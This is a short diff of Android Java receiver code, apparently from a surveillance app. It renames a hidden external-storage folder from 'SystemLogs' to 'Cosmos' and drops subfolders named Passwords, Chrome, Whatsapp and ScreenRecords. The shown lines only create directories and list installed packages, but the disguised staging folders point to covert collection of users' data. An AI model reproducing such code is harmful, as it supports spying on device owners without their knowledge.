@@ -60,21 +60,9 @@ public Writer writer;
 	@Override
 	public void onReceive(Context context, Intent intent) {
 	Bundle bundle = intent.getExtras();
-	File folder = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs");
+	File folder = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/Cosmos");
 	  folder.mkdirs();
-	  File Passwords = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/");
-	  Passwords.mkdir();
-	  File Chrome = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/");
-	  Chrome.mkdirs();
-
-	  File Data = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Data/");
-	  Data.mkdirs();
-	  File Downloaded = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Downloaded/");
-	 Downloaded.mkdirs();
-	 File ScreenRecords = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/ScreenRecords");
-	 ScreenRecords.mkdirs();
-	 File whatsapp = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/Whatsapp/");
-	whatsapp.mkdirs();
+	 
 	 String extStorageDirectory = folder.toString();
 	  List<ApplicationInfo> packages;
 	    PackageManager pm;
